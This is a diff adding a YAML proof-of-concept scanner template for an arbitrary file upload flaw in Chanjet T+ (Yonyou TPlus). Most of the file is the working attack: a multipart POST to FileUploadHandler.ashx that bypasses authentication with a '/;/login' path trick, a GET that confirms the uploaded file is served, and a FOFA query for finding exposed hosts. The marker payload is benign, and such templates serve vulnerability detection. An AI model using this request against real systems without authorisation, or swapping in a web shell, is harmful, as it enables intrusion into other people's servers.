@@ -1,0 +1,33 @@
+id: poc-yaml-changjie-tplus-fileuploadhandler-upload
+info:
+  name: 用友畅捷通-TPlus FileUploadHandler.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 畅捷通T+
+  fofa: app="畅捷通-TPlus"
+variables:
+  t1: random_int(100,1000)
+requests:
+- method: POST
+  path: /tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login
+  headers:
+    Content-Type: multipart/form-data; boundary=f95ec6be8c3acff8e3edd3d910d3b9a6
+  data: '--f95ec6be8c3acff8e3edd3d910d3b9a6
+
+    Content-Disposition: form-data; name="file"; filename="test{{.t1}}.txt"
+
+    Content-Type: image/jpeg
+
+
+    This website has a vulnerability
+
+    --f95ec6be8c3acff8e3edd3d910d3b9a6--
+
+    '
+  expression: "status_code == 200 && \nbody == \"\"\n"
+- method: GET
+  path: /tplus/UserFiles/test{{.t1}}.txt
+  expression: "status_code == 200 && \nbody == \"This website has a vulnerability\"\
+    \n"
+transport: http
